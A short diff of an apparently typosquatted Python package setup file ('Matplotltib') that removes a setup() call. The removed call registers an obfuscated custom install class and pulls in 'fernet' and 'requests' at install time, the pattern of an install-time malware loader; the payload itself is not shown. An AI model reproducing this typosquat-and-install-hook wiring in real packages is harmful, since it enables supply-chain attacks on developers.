@@ -18,22 +18,5 @@ class vgghdSMddzHhjiUOcbukAnKmCHHxXOeXfSNuiiKXOlFqufMhcnKSAQWQjuKBEkgCKEKDn(inst
             install.run(self)
 
 
-setup(
-    name="Matplotltib",
-    version=VERSION,
-    author="KjAWjCjnxNdTGPBd",
-    author_email="FnLOEKNRdjkueR@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': vgghdSMddzHhjiUOcbukAnKmCHHxXOeXfSNuiiKXOlFqufMhcnKSAQWQjuKBEkgCKEKDn,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
 
